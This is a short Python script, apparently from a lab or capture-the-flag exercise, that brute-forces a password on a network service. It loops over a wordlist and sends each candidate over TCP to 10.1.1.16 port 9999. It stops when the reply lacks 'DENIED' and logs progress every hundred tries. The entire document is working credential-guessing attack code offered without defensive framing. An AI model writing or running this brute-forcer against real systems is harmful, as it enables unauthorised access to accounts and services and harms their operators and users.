import socket, time

wordlist = open('wordlist.txt').read().split('\n')

for i, password in enumerate(wordlist):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.1.1.16', 9999))
    s.recv(1024)

    s.sendall(bytes(password + '\r\n', 'utf-8'))
    response = s.recv(1024)
    
    if 'DENIED' not in response.decode('utf-8'):
        print(f'{password}: {response.decode("utf-8")}')
        s.close()
        break

    elif i % 100 == 0:
        print(f'{i} passwords tried, on password: {password}')

    s.close()

print('Exhausted.')
